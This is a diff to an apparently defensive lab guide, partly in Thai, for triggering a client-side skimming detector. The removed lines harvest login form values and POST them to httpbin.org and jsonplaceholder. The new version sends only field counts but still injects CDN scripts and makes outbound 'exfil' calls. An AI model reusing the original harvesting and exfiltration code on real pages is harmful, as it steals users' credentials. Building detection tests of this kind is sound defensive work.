@@ -52,7 +52,7 @@ var _poll = _si(function() {
       window.HTMLInputElement.prototype, 'value').set;
     nativeSet.call(emailEl, 'test@example.com');
     emailEl.dispatchEvent(new Event('input', { bubbles: true }));
-    nativeSet.call(passEl, 'P@ssword123');
+    nativeSet.call(passEl, '<DEMO_PASSWORD>');
     passEl.dispatchEvent(new Event('input', { bubbles: true }));
 
     // Run Combined Detection Script inline using native fetch for exfil
@@ -63,12 +63,11 @@ var _poll = _si(function() {
 
       _log('\n[Formjack] Phase 1: Form field harvesting');
       var inputs = document.querySelectorAll('input');
-      var harvested = {};
+      var populatedFieldCount = 0;
       inputs.forEach(function(input) {
-        var name = input.name || input.id || input.type;
-        harvested[name] = input.value || '(empty)';
+        if (input.value) populatedFieldCount++;
       });
-      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);
+      _log('[Formjack] Observed ' + inputs.length + ' fields; values discarded');
 
       _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
       var cdns = [
@@ -88,19 +87,20 @@ var _poll = _si(function() {
 
       _log('\n[Exfil] Phase 3: Data exfiltration');
       var payload = JSON.stringify({
-        type: 'combined_demo', credentials: harvested,
-        page: window.location.href, timestamp: Date.now()
+        type: 'combined_demo', field_count: inputs.length,
+        populated_field_count: populatedFieldCount,
+        field_values_discarded: true, timestamp: Date.now()
       });
       _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
-        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
+        .then(function() { _log('[Exfil] Synthetic signal sent to www.httpbin.org'); });
       _fetch('https://jsonplaceholder.typicode.com/posts', {
         method: 'POST', mode: 'no-cors',
         headers: { 'Content-Type': 'application/json' }, body: payload
-      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });
+      }).then(function() { _log('[Exfil] Synthetic signal sent to jsonplaceholder.typicode.com'); });
 
       _log('\n==================================================');
       _log('[CSD Demo] Simulation complete');
-      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
+      _log('[CSD Demo] Fields observed: ' + inputs.length + ' (values discarded)');
       _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
       _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
       _log('==================================================');
@@ -130,7 +130,7 @@ var _poll = _si(function() {
 ผู้ดำเนินการที่ไม่มีเครื่องมือการทำงานอัตโนมัติของเบราว์เซอร์จะดำเนินการตามขั้นตอนด้วยตนเอง:
 
 1. **นำทาง** ไปที่หน้าล็อกอินของแอปพลิเคชันที่ได้รับการป้องกัน: `http://xF5XC_DOMAINNAMEx/#/login`
-2. **ป้อนข้อมูลประจำตัวจำลอง** — พิมพ์ `test@example.com` ในฟิลด์ Email และ `P@ssword123` ในฟิลด์ Password (อย่ากดส่งฟอร์ม)
+2. **ป้อนข้อมูลประจำตัวจำลอง** — พิมพ์ `test@example.com` ในฟิลด์ Email และ `<DEMO_PASSWORD>` ในฟิลด์ Password (อย่ากดส่งฟอร์ม)
 3. **เปิด DevTools** — กด **F12** และเปลี่ยนไปที่แท็บ **Console**
 4. **รัน Combined Detection Script** — วางสคริปต์จาก [Trigger Detection &mdash; Run the Combined Simulation Script](/csd/th/trigger-detection/#run-the-combined-simulation-script) ลงใน console และกด Enter
 5. **ตรวจสอบผลลัพธ์ console** — ยืนยันว่าผลลัพธ์แบบเป็นเฟสของ `[CSD Demo]` แสดง: การเก็บเกี่ยวฟิลด์, การ inject สคริปต์จาก 4 โดเมน CDN และการ exfil ข้อมูลไปยัง 2 endpoint
@@ -141,7 +141,7 @@ var _poll = _si(function() {
 | --- | --- | --- |
 | การเก็บเกี่ยวฟิลด์ฟอร์ม | อ่านค่า input email และ password | สคริปต์ที่อ่านฟิลด์ฟอร์มที่ละเอียดอ่อน — ถูกตั้งค่าสถานะเป็นความเสี่ยงสูง |
 | การ inject สคริปต์ | Inject แท็ก `&lt;script&gt;` 4 รายการจาก `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io` | ตรวจพบโดเมนสคริปต์ third-party ใหม่สูงสุด 4 โดเมน (ความพร้อมใช้งาน CDN อาจแตกต่างกัน) |
-| การ exfil ข้อมูล | ส่งข้อมูลที่เก็บเกี่ยวผ่าน `fetch` ไปยัง `www.httpbin.org` และ `jsonplaceholder.typicode.com` | การเรียกเครือข่ายไปยังโดเมนภายนอก |
+| สัญญาณเครือข่ายสังเคราะห์ | ส่งจำนวนฟิลด์และเครื่องหมายยืนยันการทิ้งผ่าน `fetch` โดยค่าฟิลด์ไม่เข้าสู่ payload | การเรียกเครือข่ายไปยังโดเมนภายนอก |
 
 <Aside type="note">
 **ความพร้อมใช้งานของ CDN แตกต่างกัน** สคริปต์ CDN ทั้ง 4 รายการอาจไม่โหลดได้ทุกครั้ง — ข้อจำกัดทรัพยากรเบราว์เซอร์ สภาพเครือข่าย หรือการ throttle ของ CDN อาจทำให้บางรายการล้มเหลวด้วย `ERR_INSUFFICIENT_RESOURCES` หรือหมดเวลา การจำลองสำเร็จหากสคริปต์ CDN **ใดก็ตาม** โหลดได้ CSD ตรวจจับความพยายาม inject โดยไม่คำนึงว่าสคริปต์จะโหลดสำเร็จหรือไม่ — การสร้างแท็ก `&lt;script&gt;` เองคือสัญญาณการตรวจจับ
